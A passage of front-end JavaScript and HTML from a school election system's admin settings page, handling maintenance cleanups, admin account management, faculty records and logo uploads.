            <div class="maintenance-row">
                <div class="mt-info"><strong>Vote drafts from closed or archived elections</strong><span class="mt-count" id="mt-drafts-count">...</span></div>
                <button class="btn btn-secondary btn-sm" onclick="pruneMaintenance('prune_drafts')" title="These drafts can never be submitted any more">Clean up</button>
            </div>
            <div class="maintenance-row">
                <div class="mt-info"><strong>Login attempt rows older than 7 days</strong><span class="mt-count" id="mt-attempts-count">...</span></div>
                <button class="btn btn-secondary btn-sm" onclick="pruneMaintenance('prune_attempts')" title="Keeps the active 5-minute throttle window intact">Clean up</button>
            </div>
            <div class="maintenance-row">
                <div class="mt-info"><strong>Activity log lines older than one year</strong><span class="mt-count" id="mt-logs-count">...</span></div>
                <button class="btn btn-secondary btn-sm" onclick="pruneMaintenance('prune_logs')" title="Keeps the current school year's trail">Clean up</button>
            </div>
        </div>
    
        <div class="card">
            <h2 class="section-title">Admin accounts</h2>
            <p class="muted" style="margin:-0.5rem 0 1rem;font-size:.82rem;">Who can sign in to this panel. Adding, resetting, or removing an account is recorded in the activity log.</p>
            <div id="adminAcctList"><p class="settings-empty">Loading accounts...</p></div>
            <div class="settings-add-row adminacct-add">
                <input type="text" id="newAdminUser" placeholder="Username (3-50 chars)" maxlength="50">
                <input type="email" id="newAdminEmail" placeholder="Email (optional)" maxlength="100">
                <input type="password" id="newAdminPass" placeholder="Initial password (8+ chars, letters + numbers)" maxlength="128">
                <button class="btn btn-primary btn-sm" onclick="createAdmin()">+ Add Admin</button>
            </div>
        </div>
    `;
    loadMaintenanceCounts();
    loadAdminAccounts();
}

// ---------- Maintenance (Batch A4) ----------
async function loadMaintenanceCounts(){
    try {
        const res = await fetch(`${SETTINGS_API}?type=maintenance`);
        const c = await res.json();
        document.getElementById('mt-drafts-count').textContent = c.drafts_closed_elections + ' row(s)';
        document.getElementById('mt-attempts-count').textContent = c.attempts_older_than_7d + ' row(s)';
        document.getElementById('mt-logs-count').textContent = c.logs_older_than_365d + ' row(s)';
    } catch (e) { /* counts stay "..." - the actions still work */ }
}
async function pruneMaintenance(action){
    const labels = {
        prune_drafts: 'Delete vote drafts belonging to closed or archived elections?',
        prune_attempts: 'Delete login attempt rows older than 7 days?',
        prune_logs: 'Delete activity log lines older than one year?'
    };
    if (!confirm(labels[action] || 'Run this cleanup?')) return;
    try {
        const res = await fetch(SETTINGS_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ csrf_token: CSRF_TOKEN, type: 'maintenance', action })
        });
        const data = await res.json();
        if (data.success) {
            showToast(`Cleanup done - ${data.removed} row(s) removed.`, 'success');
            loadMaintenanceCounts();
        } else {
            showToast(data.error || 'Cleanup failed.', 'error');
        }
    } catch (e) {
        showToast('Cleanup failed.', 'error');
    }
}
// ---------- Admin accounts (Batch B1) ----------
async function loadAdminAccounts(){
    try {
        const res = await fetch('api/admins.php');
        const list = await res.json();
        const host = document.getElementById('adminAcctList');
        if (!host || !Array.isArray(list)) return;
        host.innerHTML = list.map(a => `
            <div class="adminacct-row">
                <div class="adminacct-info">
                    <strong>${escapeHtml(a.username)}${a.is_me ? '<span class="you-badge">You</span>' : ''}</strong>
                    <span class="adminacct-meta">${escapeHtml(a.email || 'no email')} &middot; added ${escapeHtml(String(a.created_at || '').slice(0, 10))}${a.last_login ? ' &middot; last login ' + escapeHtml(String(a.last_login).slice(0, 16).replace('T', ' ')) : ' &middot; never logged in'}</span>
                </div>
                <button class="btn btn-secondary btn-sm" data-id="${a.id}" data-user="${escapeHtml(a.username)}" data-me="${a.is_me ? 1 : 0}" onclick="changeAdminPassword(this.dataset.id, this.dataset.user, this.dataset.me === '1')">Password</button>
                ${a.is_me ? '' : `<button class="btn btn-danger btn-sm" data-id="${a.id}" data-user="${escapeHtml(a.username)}" onclick="deleteAdmin(this.dataset.id, this.dataset.user)" title="Remove this admin">Delete</button>`}
            </div>`).join('') || '<p class="settings-empty">No accounts.</p>';
    } catch (e) { /* card keeps its loading line */ }
}
async function createAdmin(){
    const username = document.getElementById('newAdminUser').value.trim();
    const email = document.getElementById('newAdminEmail').value.trim();
    const password = document.getElementById('newAdminPass').value;
    if (!username) { showToast('Enter a username.', 'error'); return; }
    if (!password) { showToast('Enter an initial password.', 'error'); return; }
    try {
        const res = await fetch('api/admins.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ csrf_token: CSRF_TOKEN, username, email, password })
        });
        const data = await res.json();
        if (data.success) {
            showToast(`Admin account "${username}" created.`, 'success');
            document.getElementById('newAdminUser').value = '';
            document.getElementById('newAdminEmail').value = '';
            document.getElementById('newAdminPass').value = '';
            loadAdminAccounts();
        } else {
            showToast(data.error || 'Could not create the account.', 'error');
        }
    } catch (e) {
        showToast('Could not create the account.', 'error');
    }
}
async function changeAdminPassword(id, username, isMe){
    const next = prompt(`New password for "${username}" (8+ chars, letters and numbers):`, '');
    if (next === null || next === '') return;
    const payload = { csrf_token: CSRF_TOKEN, id: Number(id), password: next };
    if (isMe) {
        const cur = prompt('This is your own account - enter your CURRENT password to confirm:', '');
        if (cur === null) return;
        payload.current_password = cur;
    }
    try {
        const res = await fetch('api/admins.php', {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await res.json();
        if (data.success) {
            showToast(`Password updated for "${username}".`, 'success');
            loadAdminAccounts();
        } else {
            showToast(data.error || 'Could not update the password.', 'error');
        }
    } catch (e) {
        showToast('Could not update the password.', 'error');
    }
}
async function deleteAdmin(id, username){
    if (!confirm(`Remove the admin account "${username}"? They will no longer be able to sign in.`)) return;
    try {
        const res = await fetch('api/admins.php', {
            method: 'DELETE',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ csrf_token: CSRF_TOKEN, id: Number(id) })
        });
        const data = await res.json();
        if (data.success) {
            showToast(`Admin account "${username}" removed.`, 'success');
            loadAdminAccounts();
        } else {
            showToast(data.error || 'Could not remove the account.', 'error');
        }
    } catch (e) {
        showToast('Could not remove the account.', 'error');
    }
}
// ---------- Departments ----------
async function createDepartment(){
    const name = document.getElementById('newDeptName').value.trim();
    if (!name) { showToast('Enter a faculty name.', 'warning'); return; }
    try {
        const res = await fetch(SETTINGS_API, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({csrf_token: CSRF_TOKEN, type:'department', name})
        });
        const data = await res.json();
        if (res.ok && data.success) {
            addLog(`Added faculty "${name}"`);
            showToast('Faculty added.', 'success');
            await loadSettingsData(true);
            renderSettingsContent();
        } else {
            showToast(data.error || 'Could not add faculty.', 'error');
        }
    } catch (e) { showToast('Network error. Please try again.', 'error'); }
}

async function saveDepartmentRow(i){
    const d = settingsData.departments[i];
    const newName = document.getElementById(`dept_name_${i}`).value.trim();
    if (!newName) { showToast('Faculty name cannot be empty.', 'error'); return; }

    const nameChanged = newName !== d.name;
    if (nameChanged) {
        const confirmed = await showConfirmModal({
            title: 'Rename this faculty?',
            message: `Renaming "${d.name}" to "${newName}" will update every existing student and election currently using "${d.name}" so they use "${newName}" instead. This cannot be undone.`,
            confirmLabel: 'Rename & Update Records',
        });
        if (!confirmed) return;
    }

    try {
        const res = await fetch(SETTINGS_API, {
            method: 'PUT',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({csrf_token: CSRF_TOKEN, type:'department', old_code: d.code, name: newName, sort_order: i})
        });
        const data = await res.json();
        if (res.ok && data.success) {
            let msg = 'Faculty saved.';
            if (nameChanged) {
                const parts = [];
                if (data.updated_students) parts.push(`${data.updated_students} student${data.updated_students===1?'':'s'}`);
                if (data.updated_elections) parts.push(`${data.updated_elections} election${data.updated_elections===1?'':'s'}`);
                msg = parts.length ? `Renamed — updated ${parts.join(' and ')}.` : 'Renamed.';
                allStudentsCache = null; // faculty values changed — invalidate so the Students table reflects it
            }
            addLog(`Updated faculty "${d.name}"${nameChanged ? ` → renamed to "${newName}"` : ''}`);
            showToast(msg, 'success');
            await loadSettingsData(true);
            renderSettingsContent();
        } else {
            showToast(data.error || 'Could not save.', 'error');
        }
    } catch (e) { showToast('Network error. Please try again.', 'error'); }
}

async function deleteDepartmentRow(i){
    const d = settingsData.departments[i];
    const confirmed = await showConfirmModal({
        title: 'Delete this faculty?',
        message: `"${escapeHtml(d.code)}" will be permanently removed. This is blocked if any student or election is still using it.`,
        confirmLabel: 'Delete Faculty',
    });
    if (!confirmed) return;
    try {
        const res = await fetch(SETTINGS_API, {
            method: 'DELETE',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({csrf_token: CSRF_TOKEN, type:'department', code: d.code})
        });
        const data = await res.json();
        if (res.ok && data.success) {
            addLog(`Deleted faculty "${escapeHtml(d.code)}"`);
            showToast('Faculty deleted.', 'success');
            await loadSettingsData(true);
            renderSettingsContent();
        } else {
            showToast(data.error || 'Delete failed.', 'error');
        }
    } catch (e) { showToast('Network error. Please try again.', 'error'); }
}

async function moveDepartment(i, dir){
    const arr = settingsData.departments;
    const j = i + dir;
    if (j < 0 || j >= arr.length) return;
    [arr[i], arr[j]] = [arr[j], arr[i]];
    renderSettingsContent();
    try {
        await Promise.all(arr.map((d, idx) => fetch(SETTINGS_API, {
            method: 'PUT',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({csrf_token: CSRF_TOKEN, type:'department', old_code: d.code, name: d.name, sort_order: idx})
        })));
    } catch (e) { showToast('Could not save the new order.', 'error'); }
}

// ---------- Logos (SSG site-wide + per-department DSG) ----------
// Both go through the same 2MB client-side check before even reading the
// file (matches the server-side cap in api/settings.php), so an oversized
// image is rejected instantly instead of after a slow base64 round-trip.
const LOGO_MAX_BYTES = 2 * 1024 * 1024;

function handleSsgLogoUpload(evt){
    const file = evt.target.files[0];
    evt.target.value = ''; // allow re-selecting the same file later
    if (!file) return;
    if (file.size > LOGO_MAX_BYTES) { showToast('Logo is too large (max 2MB).', 'error'); return; }
    const reader = new FileReader();
    reader.onload = e => { saveSsgLogo(e.target.result); };
    reader.readAsDataURL(file);
}

async function saveSsgLogo(dataUrl){
    try {
        const res = await fetch(SETTINGS_API, {
            method: 'PUT',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({csrf_token: CSRF_TOKEN, type:'site_setting', key:'ssg_logo', value: dataUrl})
        });
        const data = await res.json();
        if (res.ok && data.success) {
            addLog(dataUrl ? 'Updated SSG logo' : 'Removed SSG logo');
            showToast(dataUrl ? 'SSG logo saved.' : 'SSG logo removed.', 'success');
            await loadSettingsData(true);
            renderSettingsContent();
        } else {
            showToast(data.error || 'Could not save the logo.', 'error');
        }
    } catch (e) { showToast('Network error. Please try again.', 'error'); }
}

async function clearSsgLogo(){
    const confirmed = await showConfirmModal({
        title: 'Remove the SSG logo?',
        message: 'SSG elections will show the placeholder icon instead, until a new logo is uploaded.',
        confirmLabel: 'Remove Logo',
    });
    if (!confirmed) return;
    await saveSsgLogo(null);
}

function handleDeptLogoUpload(evt, code){
    const file = evt.target.files[0];
    evt.target.value = '';
    if (!file) return;
    if (file.size > LOGO_MAX_BYTES) { showToast('Logo is too large (max 2MB).', 'error'); return; }
    const reader = new FileReader();
    reader.onload = e => { saveDeptLogo(code, e.target.result); };
    reader.readAsDataURL(file);
}

async function saveDeptLogo(code, dataUrl){
    try {
        const res = await fetch(SETTINGS_API, {
            method: 'PUT',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({csrf_token: CSRF_TOKEN, type:'department_logo', code, logo: dataUrl})
        });
        const data = await res.json();
        if (res.ok && data.success) {
            addLog(`${dataUrl ? 'Updated' : 'Removed'} logo for department "${code}"`);
            showToast(dataUrl ? 'Department logo saved.' : 'Department logo removed.', 'success');
            await loadSettingsData(true);
            renderSettingsContent();
        } else {
            showToast(data.error || 'Could not save the logo.', 'error');
        }
    } catch (e) { showToast('Network error. Please try again.', 'error'); }
}

async function clearDeptLogo(code){
    const confirmed = await showConfirmModal({
        title: 'Remove this department\u2019s logo?',
        message: `Its DSG elections will show the placeholder icon instead, until a new logo is uploaded.`,
        confirmLabel: 'Remove Logo',
    });
    if (!confirmed) return;
    await saveDeptLogo(code, null);
}

// ------------------------------------------------------------------
// INIT
// ------------------------------------------------------------------
window.addEventListener('beforeunload', (e) => {
    if (wizardIsDirty()) {
        e.preventDefault();
        e.returnValue = '';
    }
});

async function init(){
    await loadSettingsData();
    await renderDashboard();
    await loadElectionList();
    await renderStudentList();
    await renderResults();
    renderLogs();
}
init();
</script>
</body>
</html>
